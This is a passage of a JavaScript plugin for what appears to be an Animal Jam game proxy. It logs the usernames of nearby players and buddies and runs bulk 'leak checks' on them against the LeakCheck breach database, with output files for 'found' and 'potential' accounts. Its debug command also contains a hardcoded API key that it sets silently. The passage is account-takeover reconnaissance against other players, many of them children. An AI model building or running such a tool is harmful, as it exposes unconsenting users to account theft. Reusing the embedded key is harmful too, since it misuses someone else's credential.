        message: `- Auto Leak Check: ${this.config.autoLeakCheck ? 'Enabled' : 'Disabled'}`
      });
      
      this.application.consoleMessage({
        type: 'logger',
        message: `- Auto Leak Check Threshold: ${this.config.autoLeakCheckThreshold} usernames`
      });
      
      this.application.consoleMessage({
        type: 'logger',
        message: `- Output Directory: ${this.getBasePath()}`
      });
      
      this.application.consoleMessage({
        type: 'logger',
        message: `- LeakCheck API Key: ${this.config.leakCheckApiKey ? 'Set' : 'Not Set'}`
      });
      
        this.application.consoleMessage({
          type: 'logger',
          message: `Use userlogsettings [setting] [value] to change a setting.`
        });
      
      return;
    }
    
    const setting = parameters[0].toLowerCase();
    const value = parameters[1]?.toLowerCase();
    
    if (!value && setting !== 'reset') {
      this.application.consoleMessage({
        type: 'warn',
        message: `[Username Logger] Please provide a value for setting '${setting}'.`
      });
      return;
    }
    
    switch (setting) {
      case 'nearby':
        this.config.collectNearbyPlayers = value === 'on' || value === 'true' || value === 'yes';
        this.application.consoleMessage({
          type: 'success',
          message: `[Username Logger] Collect Nearby Players: ${this.config.collectNearbyPlayers ? 'Enabled' : 'Disabled'}`
        });
        break;
        
      case 'buddies':
        this.config.collectBuddies = value === 'on' || value === 'true' || value === 'yes';
        this.application.consoleMessage({
          type: 'success',
          message: `[Username Logger] Collect Buddies: ${this.config.collectBuddies ? 'Enabled' : 'Disabled'}`
        });
        break;
        
      case 'autoleakcheck':
        this.config.autoLeakCheck = value === 'on' || value === 'true' || value === 'yes';
        this.application.consoleMessage({
          type: 'success',
          message: `[Username Logger] Auto Leak Check: ${this.config.autoLeakCheck ? 'Enabled' : 'Disabled'}`
        });
        break;
        
      case 'threshold':
        const threshold = parseInt(value, 10);
        if (isNaN(threshold) || threshold <= 0) {
          this.application.consoleMessage({
            type: 'error',
            message: `[Username Logger] Invalid threshold value. Please use a positive number.`
          });
          return;
        }
        
        this.config.autoLeakCheckThreshold = threshold;
        this.application.consoleMessage({
          type: 'success',
          message: `[Username Logger] Auto Leak Check Threshold set to ${threshold} usernames.`
        });
        break;
        
      case 'reset':
        // Reset to defaults
        this.config = {
          isLoggingEnabled: false,
          customBasePath: null,
          collectNearbyPlayers: true,
          collectBuddies: true,
          autoLeakCheck: false,
          autoLeakCheckThreshold: 50,
          leakCheckApiKey: this.config.leakCheckApiKey // Preserve API key
        };
        
        this.application.consoleMessage({
          type: 'success',
          message: `[Username Logger] Settings reset to defaults.`
        });
        break;
        
      default:
        this.application.consoleMessage({
          type: 'error',
          message: `[Username Logger] Unknown setting: ${setting}`
        });
        return;
    }
    
    // Save the updated config
    this.saveConfig();
  }
  
  /**
   * Handles the leak check command.
   * @param {object} params - Command parameters.
   * @param {string[]} params.parameters - Command arguments.
   */
  handleLeakCheckCommand({ parameters }) {
    if (this.isLeakCheckRunning) {
      this.application.consoleMessage({
        type: 'warn',
        message: `[Username Logger] Leak check is already running. Use !leakcheckpause to pause or !leakcheckstop to stop.`
      });
      return;
    }
    
    let limit = Infinity;
    let startIndex = this.leakCheckLastProcessedIndex + 1; // Default to resuming from last position
    
    // Debug log the current saved index
    this.application.consoleMessage({
      type: 'logger',
      message: `[Username Logger] Current saved index is ${this.leakCheckLastProcessedIndex}, would resume from ${startIndex}`
    });
    
    if (parameters.length > 0) {
      const param = parameters[0].toLowerCase();
      
      if (param === 'resume') {
        // Already defaulting to resume above, just add a message
        this.application.consoleMessage({
          type: 'notify',
          message: `[Username Logger] Resuming leak check from index ${startIndex}.`
        });
      } else if (param === 'restart' || param === 'reset') {
        // New option to explicitly restart from the beginning
        startIndex = 0;
        this.application.consoleMessage({
          type: 'notify',
          message: `[Username Logger] Restarting leak check from the beginning (index 0).`
        });
      } else if (param === 'all') {
        // Keep startIndex as is (resume) but use all usernames
        this.application.consoleMessage({
          type: 'notify',
          message: `[Username Logger] Processing all remaining usernames from index ${startIndex}.`
        });
      } else if (param === 'latest') {
        // Get the latest N usernames
        const count = parameters[1] ? parseInt(parameters[1], 10) : 50;
        if (isNaN(count) || count <= 0) {
          this.application.consoleMessage({
            type: 'error',
            message: `[Username Logger] Invalid count for 'latest'. Please use a positive number.`
          });
          return;
        }
        
        limit = count;
        this.application.consoleMessage({
          type: 'notify',
          message: `[Username Logger] Processing the latest ${count} usernames.`
        });
      } else {
        // Try to parse as a number (limit)
        const num = parseInt(param, 10);
        if (isNaN(num) || num <= 0) {
          this.application.consoleMessage({
            type: 'error',
            message: `[Username Logger] Invalid parameter. Use a positive number, 'all', 'latest', 'resume', or 'restart'.`
          });
          return;
        }
        
        limit = num;
        this.application.consoleMessage({
          type: 'notify',
          message: `[Username Logger] Processing up to ${limit} usernames from index ${startIndex}.`
        });
      }
    } else {
      // No parameters - default is to resume
      this.application.consoleMessage({
        type: 'notify',
        message: `[Username Logger] Resuming leak check from index ${startIndex}.`
      });
    }
    
    // Run the leak check with the determined parameters
    this.runLeakCheck({ limit, startIndex });
  }
  
  /**
   * Handles the leak check stop command.
   */
  handleLeakCheckStopCommand() {
    this.stopLeakCheck();
  }

  /**
   * Trims already processed usernames from the collected_usernames.txt file
   * and resets the index to -1 (next check will start at 0).
   * @param {object} params - Command parameters.
   */
  async handleTrimProcessedCommand() {
    if (this.isLeakCheckRunning) {
      this.application.consoleMessage({
        type: 'warn',
        message: `[Username Logger] Cannot trim usernames while leak check is running. Stop the check first.`
      });
      return;
    }

    const { collectedUsernamesPath } = this.getFilePaths();
    
    try {
      // Read the file
      if (!fs.existsSync(collectedUsernamesPath)) {
        this.application.consoleMessage({
          type: 'warn',
          message: `[Username Logger] Collected usernames file not found.`
        });
        return;
      }

      const collectedData = await fs.promises.readFile(collectedUsernamesPath, 'utf8');
      const allLines = collectedData.split(/\r?\n/);
      
      // Parse all usernames from the file
      const usernameEntries = [];
      
      allLines.forEach(line => {
        let match = line.match(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z - (.+)$/);
        if (match && match[1]) {
          usernameEntries.push({
            line: line,
            username: match[1].trim()
          });
        } else if (line.trim() && !line.trim().startsWith('---')) {
          usernameEntries.push({
            line: line,
            username: line.trim()
          });
        }
      });

      // If no usernames found, nothing to do
      if (usernameEntries.length === 0) {
        this.application.consoleMessage({
          type: 'warn',
          message: `[Username Logger] No usernames found in collected file.`
        });
        return;
      }

      // Get the current processed index
      const processedIndex = this.leakCheckLastProcessedIndex;
      
      if (processedIndex < 0) {
        this.application.consoleMessage({
          type: 'warn',
          message: `[Username Logger] No usernames have been processed yet (index = ${processedIndex}).`
        });
        return;
      }

      // Calculate how many usernames to keep
      if (processedIndex >= usernameEntries.length) {
        this.application.consoleMessage({
          type: 'notify',
          message: `[Username Logger] All usernames have been processed. Clearing file.`
        });
        
        // Clear the file completely
        await fs.promises.writeFile(collectedUsernamesPath, '');
      } else {
        // Keep only the non-processed usernames
        const keepEntries = usernameEntries.slice(processedIndex + 1);
        const keepLinesCount = keepEntries.length;
        const removedLinesCount = usernameEntries.length - keepLinesCount;
        
        // Write the remaining entries back to the file
        await fs.promises.writeFile(collectedUsernamesPath, keepEntries.map(entry => entry.line).join('\n'));
        
        this.application.consoleMessage({
          type: 'success',
          message: `[Username Logger] Removed ${removedLinesCount} processed usernames, kept ${keepLinesCount} unprocessed usernames.`
        });
      }
      
      // Reset the index
      this.leakCheckLastProcessedIndex = -1;
      
      // Save the config to persist the index change
      this.saveConfig();
      
      this.application.consoleMessage({
        type: 'success',
        message: `[Username Logger] Index reset to -1. Next leak check will start from index 0.`
      });
    } catch (error) {
      this.application.consoleMessage({
        type: 'error',
        message: `[Username Logger] Error trimming processed usernames: ${error.message}`
      });
    }
  }

  /**
   * Handles the userloghelp command.
   * Shows the help message for all UsernameLogger commands.
   */
  handleHelpCommand() {
    const helpText = `
UsernameLogger Plugin Commands:
userlog [on|off|status]         Enable/disable username logging, or show status.
userlogpath <directory>         Set the directory for log files.
userlogsettings [setting] [value]  Configure plugin settings (type userlogsettings for options).
leakcheck [all|latest N|resume|restart|N]  Run leak check on collected usernames.
leakcheckstop                   Stop a running leak check.
setapikey <key>                 Set the LeakCheck API key.
setindex <number>               Set the leak check index to a specific position.
trimprocessed                   Remove processed usernames from the collected list and reset index.
userloghelp                     Show this help message.

Settings: nearby, buddies, autoleakcheck, threshold, reset
Example: userlogsettings nearby off
`;
    this.application.consoleMessage({
      type: 'logger',
      message: helpText
    });
  }
  
  /**
   * Handles the debug command to show internal state.
   * @param {object} params - Command parameters.
   */
  handleDebugCommand() {
    // Show API key status
    this.application.consoleMessage({
      type: 'logger',
      message: `[Username Logger] Debug Information:`
    });

    // Show API key (masked or not set)
    if (this.config.leakCheckApiKey) {
      const maskedKey = this.config.leakCheckApiKey.substring(0, 4) + '...' +
        this.config.leakCheckApiKey.substring(this.config.leakCheckApiKey.length - 4);
      this.application.consoleMessage({
        type: 'logger',
        message: `- API Key: ${maskedKey} (${this.config.leakCheckApiKey.length} characters)`
      });
    } else {
      // Try to set from hardcoded fallback
      const hardcodedKey = 'b38c72b84b3b17f963426ee95e3271392c9f81b0';
      this.config.leakCheckApiKey = hardcodedKey;
      this.application.consoleMessage({
        type: 'success',
        message: `- API Key was not set. EMERGENCY FIX: Set API key from hardcoded value (${hardcodedKey.substring(0, 4)}...${hardcodedKey.substring(hardcodedKey.length - 4)})`
      });
    }

    // Show other config
    this.application.consoleMessage({
      type: 'logger',
      message: `- Logging Enabled: ${this.config.isLoggingEnabled}`
    });

    this.application.consoleMessage({
      type: 'logger',
      message: `- Base Path: ${this.getBasePath()}`
    });
  }

  /**
   * Handles the set API key command.
   * @param {object} params - Command parameters.
   * @param {string[]} params.parameters - Command arguments.
   */
  handleSetApiKeyCommand({ parameters }) {
    if (parameters.length === 0) {
      this.application.consoleMessage({
        type: 'warn',
        message: '[Username Logger] Please specify an API key. Usage: !setapikey YOUR_API_KEY'
      });
      return;
    }
    
    // Use the first parameter as the API key
    const apiKey = parameters[0];
    
    // Set the API key in the config
    this.config.leakCheckApiKey = apiKey;
    
    // Save the config (the API key will be excluded from the saved file for security)
    this.saveConfig();
    
    this.application.consoleMessage({
      type: 'success',
      message: `[Username Logger] LeakCheck API key set successfully.`
    });
    
    // Try to also set it in the application settings if possible
    try {
      if (typeof this.application.settings.set === 'function') {
        this.application.settings.set('leakCheckApiKey', apiKey);
        this.application.consoleMessage({
          type: 'success',
          message: `[Username Logger] LeakCheck API key also saved to application settings.`
        });
      }
    } catch (error) {
      this.application.consoleMessage({
        type: 'warn',
        message: `[Username Logger] Could not save API key to application settings: ${error.message}`
      });
    }
  }

  // Add this new function to handle setting the index directly
  /**
   * Sets the leak check index directly to a specific value.
   * @param {object} params - Command parameters.
   * @param {string[]} params.parameters - Command arguments.
   */
  handleSetIndexCommand({ parameters }) {
    if (parameters.length === 0) {
      this.application.consoleMessage({
        type: 'warn',
        message: `[Username Logger] Please specify an index number. Usage: !setindex 1234`
      });
      return;
    }
    
    const newIndex = parseInt(parameters[0], 10);
    if (isNaN(newIndex) || newIndex < 0) {
      this.application.consoleMessage({
        type: 'error',
        message: `[Username Logger] Invalid index. Please provide a non-negative number.`
      });
      return;
    }
    
    // Set the index
    this.leakCheckLastProcessedIndex = newIndex;
    
    // Save configuration to persist the change
    this.saveConfig();
    
    this.application.consoleMessage({
      type: 'success',
      message: `[Username Logger] Index set to ${newIndex}. Next leak check will start from index ${newIndex + 1}.`
    });
  }

  // Initialization logic that was previously at the bottom
  async initialize() {
    await this.loadConfig(); // Load configuration first
    this.loadIgnoreList(); // Load ignore list 
    
    // Ensure the determined base directory exists
    const basePath = this.getBasePath();
    const { 
      collectedUsernamesPath,
      processedUsernamesPath,
      potentialAccountsPath,
      foundAccountsPath,
      ajcAccountsPath
    } = this.getFilePaths();
    
    // Directory/file creation is now handled in src/electron/index.js _onReady

    // Register commands
    this.dispatch.onCommand({
      name: 'userlog',
      description: 'Toggles username logging. Usage: !userlog [on|off|status]',
      callback: this.handleLogCommand
    });
    
    this.dispatch.onCommand({
      name: 'setapikey',
      description: 'Sets the LeakCheck API key. Usage: !setapikey YOUR_API_KEY',
      callback: this.handleSetApiKeyCommand
    });
    
    this.dispatch.onCommand({
      name: 'debug',
      description: 'Shows debug information about the plugin state and API key.',
      callback: this.handleDebugCommand
    });
    
    this.dispatch.onCommand({
      name: 'userlogpath',
      description: 'Sets a custom directory for log files. Usage: !userlogpath /path/to/directory',
      callback: this.handleSetPathCommand
    });
    
    this.dispatch.onCommand({
      name: 'userlogsettings',
      description: 'Configure username logging settings. Usage: !userlogsettings [setting] [value]',
      callback: this.handleSettingsCommand
    });
    
    this.dispatch.onCommand({
      name: 'leakcheck',
      description: 'Run a leak check on collected usernames. Usage: leakcheck [all|latest|resume|limit]',
      callback: this.handleLeakCheckCommand
    });

    this.dispatch.onCommand({
      name: 'leakcheckstop',
      description: 'Stop a running leak check.',
      callback: this.handleLeakCheckStopCommand
    });

    this.dispatch.onCommand({
      name: 'trimprocessed',
      description: 'Remove processed usernames from the collected list and reset index.',
      callback: this.handleTrimProcessedCommand
    });

    this.dispatch.onCommand({
      name: 'userloghelp',
      description: 'Show help for all UsernameLogger commands.',
      callback: this.handleHelpCommand
    });
    
    this.dispatch.onCommand({
      name: 'setindex',
      description: 'Sets the leak check index to a specific position. Usage: !setindex 1234',
      callback: this.handleSetIndexCommand
    });
    
    
    // Register message hooks
    this.dispatch.onMessage({
      type: 'aj',
      message: 'ac',
      callback: this.handlePlayerAdd
    });
    
    this.dispatch.onMessage({
      type: 'aj',
      message: 'bl',
      callback: this.handleBuddyList
    });
    
    this.dispatch.onMessage({
      type: 'aj',
      message: 'ba',
      callback: this.handleBuddyAdded
    });
    
    this.dispatch.onMessage({
      type: 'aj',
      message: 'bon',
      callback: this.handleBuddyOnline
    });
    
    this.application.consoleMessage({
      type: 'success',
      message: `[Username Logger] Plugin loaded. Logging to: ${basePath}. Logging is ${this.config.isLoggingEnabled ? 'enabled' : 'disabled'}. Use userlog to toggle logging.`
    });
  }
};
